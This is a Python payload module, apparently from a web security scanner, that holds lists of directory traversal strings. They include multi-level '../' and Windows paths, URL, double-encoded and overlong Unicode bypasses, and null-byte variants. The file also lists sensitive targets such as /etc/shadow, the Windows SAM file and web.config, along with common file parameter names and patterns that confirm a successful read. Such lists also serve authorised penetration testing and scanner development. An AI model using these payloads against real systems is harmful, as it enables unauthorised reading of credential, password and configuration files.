"""
Directory Traversal Payloads — Multi-level, encoding bypass, OS-specific targets.
"""

# ── Basic Traversal (Unix) ───────────────────────────────────────────────────
BASIC_UNIX = [
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../etc/hosts',
    '../../../etc/shadow',
    '../../../proc/self/environ',
    '../../../proc/version',
]

# ── Basic Traversal (Windows) ────────────────────────────────────────────────
BASIC_WINDOWS = [
    '..\\..\\..\\Windows\\win.ini',
    '..\\..\\..\\..\\Windows\\win.ini',
    '..\\..\\..\\..\\..\\Windows\\win.ini',
    '..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts',
    '..\\..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts',
    '..\\..\\..\\boot.ini',
    '..\\..\\..\\..\\boot.ini',
]

# ── URL Encoding Bypass ──────────────────────────────────────────────────────
URL_ENCODED = [
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini',
    '..%5c..%5c..%5cWindows%5cwin.ini',
]

# ── Double URL Encoding ─────────────────────────────────────────────────────
DOUBLE_ENCODED = [
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cwin.ini',
]

# ── Null Byte Injection (legacy) ─────────────────────────────────────────────
NULL_BYTE = [
    '../../../etc/passwd%00',
    '../../../etc/passwd%00.jpg',
    '../../../etc/passwd%00.png',
    '../../../etc/passwd\x00',
    '..\\..\\..\\Windows\\win.ini%00',
    '..\\..\\..\\Windows\\win.ini%00.jpg',
]

# ── Unicode / UTF-8 Overlong ─────────────────────────────────────────────────
UNICODE_BYPASS = [
    '..%c0%af..%c0%afetc%c0%afpasswd',
    '..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
    '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
    '..%c1%9c..%c1%9c..%c1%9cWindows%c1%9cwin.ini',
]

# ── Path Normalization Bypass ────────────────────────────────────────────────
NORMALIZATION_BYPASS = [
    '....//....//....//etc/passwd',
    '....\\\\....\\\\....\\\\Windows\\\\win.ini',
    '..//..//..//etc/passwd',
    '..././..././..././etc/passwd',
    '..\\..\\..\\/etc/passwd',
    '/..../..../..../etc/passwd',
]

# ── File Inclusion Targets ───────────────────────────────────────────────────
LINUX_TARGETS = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/group',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/proc/version',
    '/proc/net/tcp',
    '/var/log/auth.log',
    '/var/log/apache2/access.log',
    '/var/log/nginx/access.log',
]

WINDOWS_TARGETS = [
    'C:\\Windows\\win.ini',
    'C:\\Windows\\system32\\drivers\\etc\\hosts',
    'C:\\boot.ini',
    'C:\\Windows\\debug\\NetSetup.log',
    'C:\\Windows\\system32\\config\\SAM',
    'C:\\inetpub\\wwwroot\\web.config',
]

# ── File Parameter Names ─────────────────────────────────────────────────────
FILE_PARAM_NAMES = [
    'file', 'path', 'filepath', 'page', 'document', 'doc', 'template',
    'include', 'dir', 'folder', 'load', 'read', 'download', 'pdf',
    'report', 'url', 'loc', 'location', 'filename', 'name',
    'content', 'view', 'resource', 'attachment',
]

# ── Traversal Success Indicators ─────────────────────────────────────────────
TRAVERSAL_SUCCESS_PATTERNS = [
    'root:',
    'root:x:',
    'daemon:x:',
    'bin/bash',
    'bin/sh',
    '/home/',
    '[extensions]',
    'for 16-bit app',
    '[fonts]',
    'WINDIR=',
    'HOME=',
    'boot loader',
    'operating systems',
]


def get_all_traversal_payloads() -> list:
    """Return all traversal payloads combined."""
    return (
        BASIC_UNIX + BASIC_WINDOWS + URL_ENCODED +
        DOUBLE_ENCODED + NULL_BYTE + UNICODE_BYPASS +
        NORMALIZATION_BYPASS
    )


def get_traversal_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate traversal payloads."""
    if depth == 'shallow':
        return BASIC_UNIX[:4] + BASIC_WINDOWS[:2]
    elif depth == 'medium':
        return BASIC_UNIX + BASIC_WINDOWS + URL_ENCODED
    else:  # deep
        return get_all_traversal_payloads()
